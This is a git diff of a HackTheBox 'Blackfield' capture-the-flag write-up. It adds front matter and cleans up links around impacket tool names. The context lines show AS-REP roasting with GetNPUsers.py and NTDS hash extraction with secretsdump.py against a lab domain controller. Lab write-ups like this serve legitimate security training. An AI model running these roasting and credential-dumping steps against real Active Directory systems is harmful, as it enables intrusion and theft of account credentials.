@@ -1,3 +1,10 @@
+---
+title: BlackField HackTheBox Writeup 
+date: 2024-06-09
+categories: [HackTheBox]
+tags: [pentest, htb, ctf]
+---
+
 # Blackfield (10.10.10.192)
 
 ## NMAP ports scan
@@ -138,7 +145,7 @@ $krb5asrep$18$support@BLACKFIELD.LOCAL:9bc77f492e1dd61a7731af1131cec9fe$c8d87447
 
 3/314 are valid and `support` has no pre auth required, that means we can asreproast that users.
 
-Using impackets [`GetNPUsers.py`](http://GetNPUsers.py) 
+Using impackets `GetNPUsers.py`
 
 ```terminal
 ❯ GetNPUsers.py BLACKFIELD.local/support -dc-ip 10.10.10.192  
@@ -467,7 +474,7 @@ The shadow copy was successfully exposed as E:\.
 
 Then I downloaded both `ntds.dit` file and `system.hive`
 
-Using [secretsdump.py](http://secretsdump.py) to crack the hash.
+Using `secretsdump.py` to crack the hash.
 
 ```terminal
 > secretsdump.py -ntds ntds.dit -system SYSTEM.SAV -hashes lmhash:nthash LOCAL
